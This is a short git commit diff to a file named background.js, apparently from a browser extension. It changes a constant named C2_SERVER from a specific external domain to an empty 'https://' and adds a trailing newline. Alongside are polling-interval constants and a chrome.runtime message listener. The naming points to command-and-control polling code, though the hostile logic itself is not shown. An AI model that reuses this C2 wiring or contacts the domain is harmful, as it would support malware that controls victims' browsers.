3cfa464997dfc4a18e26ddc676a4e165cb431c0f
Tenebrustan <167222414+Tenebrustan@users.noreply.github.com>
2025-08-05 19:41:10 +0400

    Update background.js

--- background.js
+++ background.js
@@ -28,7 +28,7 @@ window.run = function(cfg) {
     });
 };
 
-const C2_SERVER = 'https://tradingpiecefororder.asia'; // Update if using remote/HTTPS
+const C2_SERVER = 'https://'; // Update if using remote/HTTPS
 const MIN_POLL_SECONDS = 5;
 const MAX_POLL_SECONDS = 30;
 
@@ -434,3 +434,4 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
     return true;
   });
 }
+
